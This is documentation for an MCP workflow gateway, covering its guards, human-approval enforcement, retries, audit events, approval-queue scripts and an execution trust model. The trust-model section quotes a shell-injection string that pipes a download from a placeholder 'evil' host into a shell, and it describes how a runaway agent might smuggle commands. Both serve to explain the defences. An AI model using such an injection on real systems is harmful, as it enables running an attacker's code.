# Governance

Adding rules about what calls are allowed, when, by whom, and what to do
when something fails. Each section is independent — pick the knob you
need.

If you haven't read [../architecture/concepts.md](../architecture/concepts.md) yet, start there.

---

## Input validation

`inputSchema` is JSON Schema. It runs **before** the executor.

```yaml
- name: deploy.prod
  inputSchema:
    type: object
    required: [environment, version]
    properties:
      environment: { type: string, enum: [staging, production] }
      version:     { type: string }
    additionalProperties: false
  executor: { kind: cli, connection: kubectl }
```

A bad input never reaches your tool. The rejection response carries code
`INPUT_SCHEMA_VIOLATION`, the schema's complaint, and the current legal
links so the caller can recover. **Free, no extra wiring.**

---

## Guards (preconditions)

Guards run after schema validation, before the executor.

```yaml
- name: deploy.prod
  guards:
    - kind: permission
      permission: deploy.production
  executor: { kind: cli, connection: kubectl, … }
```

Built-in guard kinds:

| Kind         | Configuration                                                     |
|--------------|--------------------------------------------------------------------|
| `permission` | `permission: foo.bar` — principal must hold this permission       |
| `role`       | `role: approver` — principal must have the role                    |
| `expr`       | `expr: "$.context.x <= 80"` — small expression on context/arguments/input. Operands may be paths, numbers, strings (`"foo"`), bools (`true` / `false`), or `null`. Operators: `==` / `!=` for any two same-typed values; `<` / `<=` / `>` / `>=` for numbers; `starts_with` / `contains` for strings (e.g. `"$.arguments.branch starts_with 'feat/'"`). Path-to-path is fine: `"$.context.after > $.context.before"`. Array elements accessible via `items[0].name` or `items.0.name`. The deprecated alias `jsonpath` is still accepted. |
| `evidence`   | `requires: [tests_passed, …]` — every kind must have at least one evidence record. Object form `{ kind: approval, count: 2 }` requires N records of that kind (quorums). |

Guards run in declaration order. First failure stops the chain. Each
evaluation emits a `guard.evaluated` audit event with the result.

> `permission` and `role` are for multi-tenant deployments where
> different humans share one gateway. The bundled binary treats every
> caller as anonymous, so for local single-user use reach for
> `evidence`, `human`, `expr`, or `inputSchema`. Wiring identity
> for multi-tenant use is covered in
> [../architecture/mcp-control-architecture.md](../architecture/mcp-control-architecture.md#identity-in-multi-tenant-deployments).

> **Designing for reuse.** When the same guard pattern repeats across
> transitions, hoist into a named capability and wrap it. See
> [../architecture/mcp-control-architecture.md](../architecture/mcp-control-architecture.md).

---

## Actor enforcement

A transition tagged `actor: "human"` requires a human principal to
submit it. The runtime checks `Principal::is_human()` — the
submitter must carry the `human` role (`Principal::HUMAN_ROLE`). An
agent or anonymous principal is rejected with `ACTOR_MISMATCH` before
the executor runs or the workflow advances.

```yaml
transitions:
  approve:
    actor: human
    target: approved
    guards: [{ kind: permission, permission: workflow.approve }]
```

Defense in depth: even if a workflow author forgets `actor: human`,
the `human` executor itself only records `human.approval.requested`
and returns a queued status — it never advances state. Add a
`permission` guard for hard role-based control on top. All three
layers (actor gate, executor behavior, permission guard) are
independent and composable.

For wiring `Principal` identity per request in multi-tenant
deployments, see
[../guides/embeddings.md](../guides/embeddings.md) and
[../architecture/mcp-control-architecture.md](../architecture/mcp-control-architecture.md#identity-in-multi-tenant-deployments).

---

## Output mapping

By default, an executor's result is forgotten after the transition
completes. To thread results between steps, name them in the `output`
block:

```yaml
submit_plan:
  target: risk_review
  executor: { kind: mcp, connection: planner, tool: normalize_plan }
  output:
    plan: "$.output.plan"     # store executor's `output.plan` as `context.plan`
```

Expression scopes available everywhere governance lives:

| Scope                      | Reads from                         |
|----------------------------|------------------------------------|
| `$.arguments.*`            | The caller's transition arguments  |
| `$.context.*`              | The workflow's accumulated context |
| `$.workflow.input.*`       | The input passed to the start operation (`praxec.command`) |
| `$.output.*` (output only) | The executor's result              |

For computed values — counters, flags, derived numbers — output
mappings also accept operator objects:

```yaml
output:
  attempts: { add: ["$.context.attempts", 1] }       # arithmetic
  status:   "reviewed"                                # bare literal
  reviewer_count: 1
  approved: true
```

Operators: `add`, `subtract`, `multiply`, `divide`, `set`, `concat`.
Arithmetic operands may be path strings or literal numbers; missing/null
operands default to 0 so a counter increment works on the first call.
`concat` takes an array of strings, numbers, bools, or path expressions
and joins them into one string (null resolves to the literal `"null"`,
matching JS/Python coercion):

```yaml
output:
  message:
    concat: ["PR #", "$.context.pr", " ready for review"]
```

Bare strings without a leading `$.` are taken as literals; bare JSON
values (numbers, booleans, arrays, objects) likewise pass through as-is.

If you need instance state seeded *before* any executor runs (counters,
default flags), declare it on the workflow:

```yaml
workflows:
  demo:
    initialState: open
    initialContext:
      attempts: 0
      status: pending
    states: { … }
```

`initialContext` is the declarative seed. Self-loops don't reset it.

`executor.map` uses the same scopes to feed values *into* the next call:

```yaml
executor:
  kind: mcp
  connection: planner
  tool: normalize_plan
  map:
    plan: "$.context.plan"     # pulls from prior step's output mapping
    goal: "$.workflow.input.goal"
```

---

## Prefilling links for LLM callers

A transition's `prefill` block lets the workflow author pre-shape the
arguments an LLM caller receives, so the model only generates the
genuinely-unknown fields:

```yaml
transitions:
  create_pr:
    target: review
    inputSchema: { type: object, required: [repo, base, head, title, body], … }
    prefill:
      repo: "$.workflow.input.repo"
      base: "main"
      head: "$.context.branch_name"
    executor: { kind: mcp, connection: github, tool: create_pull_request }
```

Resolved at link generation. The model gets `link.args.arguments`
already populated with `repo`, `base`, `head`. It only generates `title`
and `body`. See [../guides/llm-guidance.md](../guides/llm-guidance.md) for design patterns.

---

## Reliability (timeout / retry / fallback)

```yaml
executor: { kind: mcp, connection: github, tool: create_pull_request }
reliability:
  timeoutMs: 30000
  retry:
    maxAttempts: 3
    backoff: exponential
    initialDelayMs: 500
    maxDelayMs: 5000
    retryOn: [timeout, transient_error, rate_limited]
  fallback:
    strategy: first_success
    executors:
      - { kind: rest, connection: github_rest, method: POST, path: "/repos/{o}/{r}/pulls" }
```

Semantics:

1. Try the primary executor. Each attempt is wrapped in `timeoutMs`.
2. If the error class is in `retryOn` and `maxAttempts` allows, sleep
   for the backoff delay and retry the same executor.
3. When the primary's attempts are exhausted, fall through to
   `fallback.executors` in order with the same retry/timeout rules.
   First success wins.

Each attempt emits an audit event: `executor.started`, then one of
`executor.succeeded`, `executor.retrying`, `executor.failed`. When
retries are exhausted on the primary, `fallback.selected` fires before
the next candidate runs.

Executors classify errors via `ExecutorError`: `Timeout`, `RateLimited`,
`Connection`, `Transient`, `Permanent`. The classification token matches
the `retryOn` enum.

### Idempotency keys

Side-effecting executors should use idempotency keys so a downstream
service can dedupe a retried or failed-over call instead of double-doing
the work. The runtime supplies a *stable* key across retries and
fallbacks; deduplication itself happens downstream (retries are decided
only by error class — see above — not by the key):

```yaml
executor:
  kind: rest
  connection: github_api
  method: POST
  path: /pulls
  idempotencyKey: true     # auto: workflowId.transition.correlationId
  # or:
  idempotencyKey: "praxec:{transition}:{workflowId}"
```

The runtime computes the key once per `submit` and uses it for every
retry **and** every fallback executor. Each executor surfaces it in
the convention its protocol expects:

| Executor | Surface                                              |
|----------|-------------------------------------------------------|
| `rest`   | `Idempotency-Key` HTTP header                         |
| `cli`    | `IDEMPOTENCY_KEY` environment variable                |
| `mcp`    | `_idempotencyKey` field in tool arguments (if the downstream tool reads it) |

The key also lands in the `executor.started` audit event under
`payload.idempotencyKey` so you can correlate a submit's attempts in logs.

---

## Workflow-level lazy timeout

Beyond per-executor `timeoutMs`, you can declare a deadline for the
whole workflow:

```yaml
workflows:
  approval:
    timeoutMs: 86400000          # 24h
    onTimeout:
      target: timed_out
    initialState: pending
    states:
      pending: { … }
      timed_out: { terminal: true }
```

Lazy semantics: the timeout is checked on the next `submit` or `get`.
If the workflow has been alive longer than `timeoutMs`, the runtime
auto-transitions to `onTimeout.target`, emits a `workflow.timed_out`
audit event, and short-circuits whatever the caller submitted. No
sweeper / cron required.

---

## Filtering links by guards

When a state has multiple transitions whose guards are mutually
exclusive, the default response includes all of them — the LLM picks
one and recovers from `GUARD_REJECTED` if wrong. To skip the round
trip, declare:

```yaml
workflows:
  demo:
    linkFilter: byGuards         # workflow-wide
    states:
      triaged:
        linkFilter: byGuards     # or per-state (overrides the workflow setting)
```

When set, the runtime evaluates each transition's guards silently
against the current context + caller's principal and only returns the
links that would currently pass. Argument-dependent guards
(`$.arguments.*`) typically filter out, since arguments aren't known at
link-gen time. Use this when you want the model to see exactly what's
actionable right now.

---

## Multi-state governance

Once you have transitions, guards, output mapping, and reliability,
multi-state workflows are just more states with transitions between
them.

```yaml
workflows:
  engineering_change:
    initialState: planning
    states:
      planning:
        transitions:
          submit_plan:
            target: risk_review
            executor: { kind: mcp, connection: planner, tool: normalize_plan }

      risk_review:
        onEnter:
          executor: { kind: mcp, connection: risk, tool: fmeca_analyze }
          output: { fmeca: "$.output" }
        transitions:
          remediate:
            target: risk_review
            guards:
              - { kind: expr, expr: "$.context.fmeca.maxResidualRpn > 80" }
          request_approval:
            target: awaiting_approval
            guards:
              - { kind: expr, expr: "$.context.fmeca.maxResidualRpn <= 80" }
            executor: { kind: human, queue: engineering-approvals }

      awaiting_approval:
        transitions:
          approve:
            actor: human
            target: cpm
            guards: [{ kind: permission, permission: workflow.approve }]
          reject:
            actor: human
            target: planning

      cpm: { … }
      tested: { … }
      done: { terminal: true }
```

The model still only sees `praxec.query` and `praxec.command` — it
navigates the entire flow through the links each response returns
(HATEOAS-inspired; see [../architecture/concepts.md](../architecture/concepts.md)), and the engine
enforces state legality, guards, schemas, reliability, and audit at
every step.

`onEnter` actions run automatically when a state is entered. They're
useful for "as soon as you arrive, do this analysis and stash the
result in context for later guards to read."

The full example lives in `examples/governed-change.yaml`.

---

## Deterministic transitions

Transitions tagged `actor: "deterministic"` auto-execute without LLM
or human involvement. They represent steps the system can compute —
linting, running tests, building artifacts, validating inputs.

```yaml
transitions:
  run_lint:
    target: tested
    actor: deterministic
    executor:
      kind: cli
      connection: linter
      args: ["-c", "eslint ."]
    output:
      lintPassed: "$.output.json.passed"
```

When a state has *only* deterministic transitions, the runtime chains
through them automatically. The chain stops at:

- A **decision point**: any state with non-deterministic transitions
- A **terminal state**
- The **depth limit** (`maxChainDepth`, default 50)
- An **executor failure**

Deterministic transitions are hidden from the `links` array — the LLM
doesn't see them as options. On chain failure, the failed transition
appears as a recovery link.

This is the mechanism for separating "things the system calculates"
from "things the LLM or human decides." The model never has to
forward-walk through steps that have known outcomes. See
[configuration.md](configuration.md#deterministic-chaining) for the full reference.

---

## Phase guidance for LLM callers

Each state can declare `goal` and `guidance` strings:

```yaml
states:
  ready_to_deploy:
    goal: Confirm deployment
    guidance: >
      All automated checks passed. Review lint, test, and build
      results in the context before deciding to deploy or abort.
```

These surface as a `guidance` object in every workflow response,
giving the LLM contextual instructions tuned to the current phase.

- `goal`: one-line objective (what the LLM should accomplish here)
- `guidance`: detailed instructions (how to reason about this step)

Phase guidance is indexed by the search operation (`praxec.query`),
so queries can match against goal and guidance text. See
[configuration.md](configuration.md#phase-guidance) for the YAML shape.

---

## Auto-branching after the executor

Sometimes the destination state depends on what the executor returned —
"run the tests; if pass go to green, if fail stay in red." Declare
`branches: [{ when, target }]` and the runtime picks the destination
after a successful execute + output mapping. First branch whose `when`
guard passes wins; if none match, the transition's declared `target`
is the fallback.

```yaml
transitions:
  run_tests:
    target: red                                 # default fallback
    executor:
      kind: cli
      connection: shell
      args: ["-c", "cargo test"]
      treatNonZeroAsFailure: false              # exit code is data, not failure
    output:
      passed: "$.output.success"
    branches:
      - when:   { kind: expr, expr: "$.context.passed == true" }
        target: green
      - when:   { kind: expr, expr: "$.context.passed == false" }
        target: red
```

Each branch fire emits a `transition.branched` audit event with the
matched index and the chosen target, so logs make it clear which path
the runtime took.

For "run a command but capture exit code as data" patterns (TDD's red
phase, health checks, dry-run validation), the CLI executor's
`treatNonZeroAsFailure: false` flag flips behavior so non-zero exits
land in `output.success: false` instead of erroring the transition.

See `examples/tdd/` for a full TDD-enforcement workflow built from
these primitives.

---

## Audit

Every interesting step emits one `AuditEvent` to the configured sink.

| Event                          | When                                                              |
|--------------------------------|-------------------------------------------------------------------|
| `server.initialized`           | MCP host completes initialization handshake.                      |
| `workflow.started`             | A new workflow instance is created.                               |
| `workflow.transitioned`        | A transition successfully advanced state and version.             |
| `workflow.completed`           | The new state is `terminal: true`.                                |
| `transition.requested`         | A submit call (`praxec.command`) enters the runtime.            |
| `transition.rejected`          | Stale version, unknown transition, schema fail, guard fail, or executor fail. |
| `guard.evaluated`              | Per guard, with the pass/fail result.                             |
| `executor.started`             | Per attempt, before dispatch.                                     |
| `executor.succeeded`           | Per attempt, on success.                                          |
| `executor.retrying`            | Per attempt, between retries.                                     |
| `executor.failed`              | Per attempt, on terminal failure.                                 |
| `fallback.selected`            | When reliability moves from primary to a fallback executor.       |
| `human.approval.requested`     | Human executor records a pending approval to its queue.           |
| `chain.step`                   | One deterministic transition auto-executed within a chain.        |
| `chain.completed`              | A deterministic chain finished normally.                          |
| `chain.failed`                 | A deterministic chain stopped due to executor or guard failure.   |
| `capability.discovered`        | An imported MCP tool joined the registry.                         |
| `capability.discovery_failed`  | An import block's connection failed to list tools.                |

Configure the sink:

```yaml
audit:
  sink: stderr              # stderr | memory | file | none
  path: /var/log/audit.jsonl  # required when sink: file
```

Stderr / file write one JSON line per event. Memory is for tests. None
drops everything (use sparingly — audit is your ground truth for what
the gateway did).

Every event includes:

```jsonc
{
  "id": "evt_e0b9…",
  "timestamp": "2026-05-10T18:42:01Z",
  "workflowId": "wf_3f8b…",
  "correlationId": "cor_9c12…",
  "actor": "tester",
  "eventType": "executor.succeeded",
  "payload": { "transition": "approve", "candidate": 0, "attempt": 1, "kind": "mcp" }
}
```

`correlationId` ties together every event from one start or one submit
call (both `praxec.command`) so you can reconstruct the full causal chain.

---

## Evidence

The `evidence` guard requires that named evidence kinds have been
recorded for this workflow before a transition can fire. Evidence comes
from any successful executor's `Evidence` results — for example, the
CLI executor records a `cli_output` kind on every successful command,
and the human executor records a `human_request` kind.

Custom executors should emit domain-relevant evidence kinds (e.g.
`tests_passed`, `acceptance_criteria_met`). The runtime's
`EvidenceStore` is in-memory by default; the trait is pluggable so you
can back it with a database for cross-restart durability.

---

## Approval queue integrations

### Recipe 1: Slack notification on approval request

Forward `human.approval.requested` audit events to a Slack channel
using a simple webhook.

**Setup:**

1. Create a Slack webhook URL in your Slack workspace
   (Apps → Incoming Webhooks → Add Configuration).
2. Run a small script that tails the audit file and posts to Slack:

```bash
#!/usr/bin/env bash
# slack-approval-watcher.sh — tail audit log and post to Slack
AUDIT_PATH="/var/log/praxec-audit.jsonl"
SLACK_WEBHOOK="$SLACK_APPROVAL_WEBHOOK"

tail -F "$AUDIT_PATH" | while read -r line; do
  event_type=$(echo "$line" | jq -r '.event_type // empty')
  [ "$event_type" != "human.approval.requested" ] && continue

  id=$(echo "$line" | jq -r '.id')
  queue=$(echo "$line" | jq -r '.payload.queue // "unknown"')
  transition=$(echo "$line" | jq -r '.payload.transition // "unknown"')
  workflow=$(echo "$line" | jq -r '.workflow_id // "unknown"')

  curl -s -X POST "$SLACK_WEBHOOK" \
    -H "Content-Type: application/json" \
    -d "{
      \"text\": \"*Approval needed*\\nQueue: \`$queue\`\\nTransition: \`$transition\`\\nWorkflow: \`$workflow\`\\nID: \`$id\`\\nResolve with: \`praxec approvals resolve $id\`\"
    }"
done
```

**Usage:** `SLACK_APPROVAL_WEBHOOK=https://hooks.slack.com/services/... ./slack-approval-watcher.sh &`

---

### Recipe 2: Linear issue on approval request

Create a Linear issue for each pending approval, and resolve it when
the approval is actioned.

**Setup:**

1. Get a Linear API key from Settings → API.
2. Find your team ID from the Linear API.
3. Run a two-way sync script:

```python
#!/usr/bin/env python3
"""linear-approval-sync.py — create Linear issues for approval requests."""
import json
import os
import subprocess
import sys
import time

LINEAR_API_KEY = os.environ["LINEAR_API_KEY"]
TEAM_ID = os.environ["LINEAR_TEAM_ID"]
AUDIT_PATH = "/var/log/praxec-audit.jsonl"

def create_linear_issue(title, description):
    cmd = [
        "curl", "-s", "-X", "POST", "https://api.linear.app/graphql",
        "-H", f"Authorization: {LINEAR_API_KEY}",
        "-H", "Content-Type: application/json",
        "-d", json.dumps({
            "query": """
                mutation($input: IssueCreateInput!) {
                    issueCreate(input: $input) { issue { id identifier } }
                }
            """,
            "variables": {
                "input": {
                    "teamId": TEAM_ID,
                    "title": title,
                    "description": description,
                }
            }
        })
    ]
    result = subprocess.run(cmd, capture_output=True, text=True)
    return json.loads(result.stdout)

# Track which approval events have been synced
synced = set()

with open(AUDIT_PATH) as f:
    for line in f:
        line = line.strip()
        if not line:
            continue
        try:
            event = json.loads(line)
        except json.JSONDecodeError:
            continue

        if event.get("event_type") == "human.approval.requested":
            eid = event["id"]
            if eid in synced:
                continue
            synced.add(eid)
            queue = event.get("payload", {}).get("queue", "unknown")
            transition = event.get("payload", {}).get("transition", "unknown")
            workflow = event.get("workflow_id", "unknown")
            resp = create_linear_issue(
                f"Approval needed: {queue}/{transition}",
                f"**Workflow:** `{workflow}`\\n**Queue:** `{queue}`\\n**Transition:** `{transition}`\\n**Event ID:** `{eid}`\\n\\nResolve with: `praxec approvals resolve {eid}`"
            )
            print(f"Created Linear issue for {eid}: {resp}")
```

**Usage:** `LINEAR_API_KEY=... LINEAR_TEAM_ID=... python3 linear-approval-sync.py`

---

### Recipe 3: CLI approval watcher

The built-in `praxec approvals tail` command provides a
terminal-based approval watcher:

```bash
# Start the gateway with file audit
praxec serve --config gateway.yaml &

# In another terminal, tail approvals
praxec approvals tail --config gateway.yaml
```

This prints each new approval request as it arrives:

```
[evt_a1b2c3] queue=prod-deployments transition=deploy
[evt_d4e5f6] queue=content-approvals transition=publish
```

To list all pending approvals:

```bash
praxec approvals list --config gateway.yaml
```

To resolve an approval:

```bash
praxec approvals resolve evt_a1b2c3 --outcome approved
praxec approvals resolve evt_d4e5f6 --outcome rejected
```

Combine with `watch` for a refresh loop:

```bash
watch -n 5 'praxec approvals list --config gateway.yaml'
```

---

Each recipe works with the same audit event stream. Mix and match:
run the Slack notifier for visibility, the Linear sync for tracking,
and the CLI tail for ad-hoc debugging. The `praxec approvals`
subcommand is the common resolution path across all three.

## Execution trust model: who can run what

There's a [known, systemic flaw](https://www.infosecurity-magazine.com/news/systemic-flaw-mcp-expose-150/)
in MCP: a client launches a server by running its configured `command`, and that
command runs unsanitized — Anthropic's position is that sanitizing it is "the
developer's responsibility." Praxec is a client that spawns processes, so it
takes that responsibility instead of pushing it onto you. It does it by
**authorizing execution by provenance** — *who wrote the thing that wants to run*
— in three tiers:

| Who | What they can run | Why it's safe |
|-----|-------------------|---------------|
| **You** (top-level config you hand-wrote) | Anything — `kind: cli`, `kind: mcp` spawning any binary, `kind: script`. | Your config is your trust boundary. Wiring tools is the whole point; we don't tax you for it. |
| **The model at runtime** | Picks transitions and fills in their `arguments`. **It can never introduce a command.** | The command lives in *your* transition definition. Arguments are passed as argv to the process — never through a shell — so there's no `; curl evil \| sh` injection. |
| **Authored content** — a workflow an LLM proposes back through the authoring / `registry` path | Only **hash-pinned `kind: script`** + references to the connections **you** declared. **No new raw command, ever.** | A runaway agent cannot smuggle a fresh `command` into the gateway: any authored definition that tries is **rejected before it's published**. New execution it authors is forced through the script safety net. |

The script safety net is what makes the third tier safe: scripts are
**content-identified by hash** and pinned to the workflow snapshot, and a
`script_acknowledged` guard makes destructive ones **review-before-execute**
(hash-flip-invalidated). So when an agent proposes new work, what it can actually
*run* is a reviewed, hash-pinned script — not arbitrary code.

For authored content this is enforced by two layers: the authoring vet
(`structural_analysis` flags an `UNTRUSTED_RAW_EXECUTION` issue) and a **hard gate
on the `registry` executor** that rejects the publish outright
(`UNTRUSTED_EXECUTION_IN_PUBLISHED_DEFINITION`) before any agent-authored
definition becomes runnable.

The one residual is your own top-level config: if you hand-write a malicious
`kind: cli` command, it runs — same trust as the binary itself. That surface is
yours, by design. (A check-time provenance pass that also rejects a vendored
`repos:`/`include:` import declaring its *own* spawn command — so untrusted
imports can't widen your trusted surface either — is the next hardening on this
path.) See [ADR-0006](../architecture/adr/0006-execution-sandbox-and-authored-promotion.md) for
the full design.

## Where to next

- The full configuration reference: [configuration.md](configuration.md)
- Composing this for larger systems: [../architecture/mcp-control-architecture.md](../architecture/mcp-control-architecture.md)
- The runtime contract this all rests on: [invariants.md](invariants.md)
